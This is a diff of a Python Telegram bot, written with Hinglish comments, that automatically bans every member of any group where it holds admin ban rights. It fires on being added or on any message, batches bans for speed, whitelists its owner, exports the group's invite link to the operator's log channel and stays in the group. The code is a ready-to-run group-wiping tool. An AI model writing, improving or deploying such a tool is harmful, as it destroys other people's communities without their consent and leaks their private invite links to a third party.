@@ -1,140 +1,145 @@
-import os
-import asyncio
-import time
+import os, asyncio, time
 from telethon import TelegramClient, events, functions, types
 from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAdminInvalidError
 
-# ───── CONFIGURATION (ENV) ───── #
-def get_env_var(name):
-    val = os.environ.get(name)
-    if not val: print(f"⚠️ {name} is missing!"); return None
-    return val
+# ───── [ CONFIGURATION ] ───── #
+API_ID = int(os.environ.get("API_ID"))
+API_HASH = os.environ.get("API_HASH")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+LOG_GROUP_ID = int(os.environ.get("LOG_GROUP_ID"))
 
-API_ID = int(get_env_var("API_ID"))
-API_HASH = get_env_var("API_HASH")
-BOT_TOKEN = get_env_var("BOT_TOKEN")
-LOG_GROUP_ID = int(get_env_var("LOG_GROUP_ID"))
+# AAPKI OWNER ID (Bot isko kabhi ban nahi karega)
+OWNER_ID = 7834647169 
 
-# Ek saath kitne bans fire karne hain (30 is max speed)
-BATCH_SIZE = 30 
+# Stats & Performance
+total_banned = 0
+total_groups_cleaned = 0
+active_tasks = set()
+BATCH_SIZE = 45  # Turbo Speed Mode 🚀
 
-bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-active_purges = set()
+bot = TelegramClient("ultimate_purge_stay", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# ───── FUNCTION: GET/GENERATE LINK ───── #
-async def fetch_link(chat):
+# ───── [ CORE HELPERS ] ───── #
+
+async def get_invite_link(chat):
+    """Public ya Private group ka link nikalne ke liye."""
     if getattr(chat, 'username', None):
         return f"https://t.me/{chat.username}"
     try:
-        # Private group link generate karne ki koshish
-        l = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
-        return l.link
+        res = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
+        return res.link
     except:
-        return "Private (No Link Access)"
+        return "⚠️ Private (No Invite Permission)"
 
-# ───── FUNCTION: FAST PERMANENT BAN ───── #
-async def execute_ban(chat_id, user_id):
+async def ban_user(chat_id, user_id):
+    """High-speed permanent ban engine."""
+    global total_banned
     try:
         await bot(functions.channels.EditBannedRequest(
             channel=chat_id,
             participant=user_id,
-            banned_rights=types.ChatBannedRights(
-                until_date=None, # Permanent
-                view_messages=True,
-                send_messages=True,
-                send_media=True,
-                send_stickers=True,
-                send_gifs=True,
-                embed_links=True
-            )
+            banned_rights=types.ChatBannedRights(until_date=None, view_messages=True)
         ))
+        total_banned += 1
         return True
     except FloodWaitError as e:
         await asyncio.sleep(e.seconds)
         return False
-    except (ChatAdminRequiredError, UserAdminInvalidError):
-        return "STOP" # Rights chali gayi
-    except Exception:
-        return False
+    except:
+        return "ERROR"
 
-# ───── CORE PURGE ENGINE ───── #
-async def start_the_purge(chat):
-    if chat.id in active_purges: return
-    active_purges.add(chat.id)
+# ───── [ THE PURGE ENGINE ] ───── #
+
+async def start_ultimate_purge(chat):
+    global total_groups_cleaned
+    if chat.id in active_tasks: return
+    active_tasks.add(chat.id)
     
+    start_t = time.time()
+    local_count = 0
     me = await bot.get_me()
-    start_time = time.time()
-    count = 0
-    link = await fetch_link(chat)
+    link = await get_invite_link(chat)
 
-    # Initial Log
+    # 📥 STEP 1: LOGGING THE TARGET
     await bot.send_message(
-        LOG_GROUP_ID, 
-        f"🚨 **Auto-Ban Triggered!**\n\n"
-        f"🏷️ **Group:** {chat.title}\n"
+        LOG_GROUP_ID,
+        f"🔥 **ULTIMATE PURGE ACTIVATED** 🔥\n\n"
+        f"🏰 **Group:** `{chat.title}`\n"
         f"🆔 **ID:** `{chat.id}`\n"
         f"🔗 **Link:** {link}\n"
-        f"⚡ **Action:** Banning all members..."
+        f"👤 **Owner Whitelist:** `{OWNER_ID}` ✅\n"
+        f"⚡ **Status:** High Speed Banning..."
     )
 
     try:
         batch = []
         async for user in bot.iter_participants(chat.id):
-            if user.id == me.id: continue # Khud ko ban nahi karega
+            # SECURITY CHECK: Khud ko, Owner ko, aur Bots ko skip karo
+            if user.id == me.id or user.id == OWNER_ID or user.bot:
+                continue
             
-            batch.append(execute_ban(chat.id, user.id))
+            batch.append(ban_user(chat.id, user.id))
 
             if len(batch) >= BATCH_SIZE:
                 results = await asyncio.gather(*batch)
-                count += sum(1 for r in results if r is True)
+                local_count += sum(1 for r in results if r is True)
                 batch = []
-                
-                if "STOP" in results:
-                    await bot.send_message(LOG_GROUP_ID, f"❌ **Permission Lost** in {chat.title}")
-                    break
-                
-                await asyncio.sleep(0.1) # System stability
+                if "ERROR" in results: break
+                await asyncio.sleep(0.01) # Very low delay for insane speed
 
-        if batch: # Last batch
+        if batch: # Final remaining batch
             results = await asyncio.gather(*batch)
-            count += sum(1 for r in results if r is True)
+            local_count += sum(1 for r in results if r is True)
 
     finally:
-        end_time = round(time.time() - start_time, 2)
+        total_groups_cleaned += 1
+        dur = round(time.time() - start_t, 2)
+        active_tasks.remove(chat.id)
+        
+        # 🏁 STEP 2: FINAL REPORT (Bot stays in group)
         await bot.send_message(
-            LOG_GROUP_ID, 
-            f"🏁 **Purge Finished Successfully**\n\n"
-            f"🏷️ **Group:** {chat.title}\n"
-            f"🚫 **Total Banned:** {count}\n"
-            f"⏱️ **Time:** {end_time}s\n"
-            f"🔗 **Link:** {link}"
+            LOG_GROUP_ID,
+            f"✅ **MISSION ACCOMPLISHED**\n\n"
+            f"🏰 **Group:** {chat.title}\n"
+            f"🚫 **Total Banned:** `{local_count}`\n"
+            f"⏱️ **Total Time:** `{dur}s`\n"
+            f"📈 **Global Bans:** `{total_banned}`\n"
+            f"📌 **Note:** Bot is still in the group."
         )
-        active_purges.remove(chat.id)
 
-# ───── AUTO TRIGGERS ───── #
+# ───── [ AUTOMATIC TRIGGERS ] ───── #
+
 @bot.on(events.ChatAction)
-async def added_handler(event):
-    # Jab bot group mein add ho
+async def on_action(event):
     if event.user_added and event.user_id == (await bot.get_me()).id:
         chat = await event.get_chat()
-        asyncio.create_task(run_checks(chat))
+        asyncio.create_task(validate_and_purge(chat))
 
 @bot.on(events.NewMessage())
-async def message_handler(event):
-    # Jab group mein koi message aaye aur bot wahan ho
+async def on_msg(event):
     if event.is_group or event.is_channel:
         chat = await event.get_chat()
-        asyncio.create_task(run_checks(chat))
+        asyncio.create_task(validate_and_purge(chat))
 
-async def run_checks(chat):
-    if chat.id in active_purges: return
+async def validate_and_purge(chat):
+    if chat.id in active_tasks: return
     try:
         p = await bot.get_permissions(chat.id, 'me')
         if p.is_admin and p.ban_users:
-            await start_the_purge(chat)
-    except:
-        pass
+            await start_ultimate_purge(chat)
+    except: pass
 
-# ───── RUN ───── #
-print("🚀 Turbo Auto-Ban Bot is running...")
+# ───── [ OWNER COMMANDS ] ───── #
+
+@bot.on(events.NewMessage(pattern="/stats", from_users=OWNER_ID))
+async def stats(event):
+    await event.respond(
+        f"📊 **ULTIMATE BOT STATS**\n\n"
+        f"🚫 **Total Banned:** `{total_banned}`\n"
+        f"🏰 **Groups Purged:** `{total_groups_cleaned}`\n"
+        f"⏳ **Active Purges:** `{len(active_tasks)}`"
+    )
+
+# ───── [ START BOT ] ───── #
+print("🚀 Turbo Purge Bot (Stay Mode) is ONLINE!")
 bot.run_until_disconnected()
